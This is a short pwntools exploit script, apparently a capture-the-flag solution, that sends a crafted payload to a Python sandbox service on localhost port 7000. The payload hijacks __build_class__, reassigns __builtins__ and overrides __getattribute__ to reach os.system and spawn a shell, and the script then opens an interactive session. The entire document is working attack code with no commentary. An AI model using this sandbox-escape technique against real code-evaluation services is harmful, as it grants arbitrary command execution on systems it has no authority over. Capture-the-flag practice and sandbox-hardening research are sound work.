from pwn import *


r = remote("localhost", 7000)


data = (b"""global __name__, tmp_build_class

for __name__ in __build_class__,:__build_class__

class update_builtins:
	global __builtins__
	for __builtins__ in __build_class__.__self__,:__name__

for tmp_build_class in __build_class__,:__name__

class g:
	global call_gadget_instance

	class call_gadget:
		for __init__ in print,:__name__
		for __getattribute__ in __loader__.load_module,:__name__

	for __builtins__.__build_class__ in call_gadget,:__name__
	class call_gadget_instance:__name__

	for __builtins__.__build_class__ in tmp_build_class,:__name__

	class call_gadget:
		for __init__ in print,:__name__
		for __getattribute__ in call_gadget_instance.os.system,:__name__

	for __builtins__.__build_class__ in call_gadget,:__name__

	class call_gadget_instance:__name__
	for __builtins__.__build_class__ in tmp_build_class,:__name__
	for ziopera in call_gadget_instance.sh,:__name__
""".replace(b"\n", b"\r"))

print(len(data))
r.sendline(data)

r.interactive()
